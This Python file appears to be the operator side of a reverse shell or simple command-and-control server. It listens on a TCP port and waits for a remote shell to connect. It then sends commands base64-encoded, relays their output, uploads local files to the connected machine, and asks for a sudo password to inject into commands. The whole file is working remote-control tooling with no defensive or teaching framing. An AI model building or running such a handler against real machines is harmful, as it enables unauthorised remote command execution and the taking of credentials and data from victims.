import sys
import socket
import base64
from time import sleep
from termcolor import colored
from traceback import format_exc

VERSION = '0.3.2'
USER_COLOR = 'green'
DIR_COLOR = 'blue'

NETWORK = {'ip': '127.0.0.1',
           'port': 8084}

for arg in ['--ip', '--port']:
    try:
        if arg in sys.argv:
            NETWORK[arg[2:]] = sys.argv[sys.argv.index(arg) + 1]
    except IndexError:
        print('[ERROR] Arguments are not valid')


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


class tools:
    @staticmethod
    def send_file(shell, *filename):
        # you can send multiple files
        # file will be taken from local filesystem
        sent = 0
        if len(filename) == 1:
            try:
                with open(filename[0], 'rb') as binary_file_source:
                    print(colored('Sending file: ' + filename[0], 'yellow'))

                    shell.send(base64.b64encode(f'recvfile|{filename[0]}:{binary_file_source.read().decode()}'.encode('utf-8')))
                return
            except FileNotFoundError:
                print(colored('No such file: ' + filename[0], 'red'))
                return False
        for file in filename:
            try:
                line_to_send = 'recvfiles'
                with open(file, 'rb') as binary_file_source:
                    line_to_send += f'|{file}:{binary_file_source.read().decode()}'
                print(colored('Sending file: ' + file, 'yellow'))
                shell.send(base64.b64encode(line_to_send.encode('utf-8')))
                sent += 1
            except FileNotFoundError:
                print(colored('No such file: ' + str(file), 'red'))
        if sent == 0:
            return False


def recvall(sock_obj):  # COPIED FROM STACKOVERFLOW
    BUFF_SIZE = 4096  # 4 KiB
    source = b''
    while True:
        part = sock_obj.recv(BUFF_SIZE)
        source += part
        if len(part) < BUFF_SIZE:
            # either 0 or end of data
            break
    return source


tools_list = {
    'recvfile': tools.send_file
}


try:
    sock.bind(tuple(NETWORK.values()))
except OSError:
    print('Address already in use. Clear/change port, or just reboot')

try:
    print('Server has successfully started')
    sock.listen(1)

    conn, addr = sock.accept()
    print('[INFO] New connection from', *addr)

    conn_info = base64.b64decode(conn.recv(1024)).decode('utf-8')
    print('Connection details:\n', conn_info, '\n')

    sleep(0.2)

    shell_disconnected = False
    do_not_ask_currdiranduser = False

    modify_cmd = {
            'cd': 'chdir',
            'mk': 'mk',  # just to create modified request to the shell, not usual
        }

    while not shell_disconnected:
        if not do_not_ask_currdiranduser:
            do_not_ask_currdiranduser = False
            currdir = '<unknown>'
            curruser = '<unknown>'

            data = base64.b64decode(conn.recv(1024)).decode('utf-8')

            if data == 'dc':    # disconnect
                print('[INFO] Shell has been disconnected')
                shell_disconnected = True
                break

            if data.startswith('currdiranduser|'):  # currdiranduser|/root/home/...|root
                currdir, curruser = data.split('|')[1:]

        if shell_disconnected:
            break

        cmd = input(f'{colored(curruser, USER_COLOR)}@{colored(currdir, DIR_COLOR)}# ')
        if cmd.strip() == '':
            do_not_ask_currdiranduser = True
            continue

        cmd_split = cmd.split()

        if 'sudo' in cmd_split:
            sudo_passwd = input('[sudo] password for sudo: ')
            cmd = ' '.join([cmd_split[0], sudo_passwd] + cmd_split[1:])

        if cmd_split[0] in tools_list and len(cmd_split) > 1:
            success = tools_list[cmd_split[0]](conn, *cmd_split[1:])
            if not success:
                do_not_ask_currdiranduser = True
                continue    # to avoid stopping
        elif cmd_split[0] not in modify_cmd:
            conn.send(base64.b64encode(cmd.encode('utf-8')))
        else:
            conn.send(base64.b64encode(f'{modify_cmd[cmd_split[0]]}|{" ".join(cmd_split[1:])}'.encode('utf-8')))

        if cmd in ['dc', 'disconnect', 'quit', 'exit']:
            raise KeyboardInterrupt

        answer = base64.b64decode(recvall(conn)).decode()

        if answer == 'dc':
            raise KeyboardInterrupt

        if answer != '<empty>':
            print(answer)

        sleep(0.1)

except KeyboardInterrupt:
    try:
        conn.send(base64.b64encode('dc'.encode('utf-8')))
    except:
        pass
    print('\nSession has been closed')
except:
    try:
        conn.send(base64.b64encode('dc'.encode('utf-8')))
    except:
        pass
    print(format_exc())
    print('Session has been closed because of an uncaught error')

sock.close()
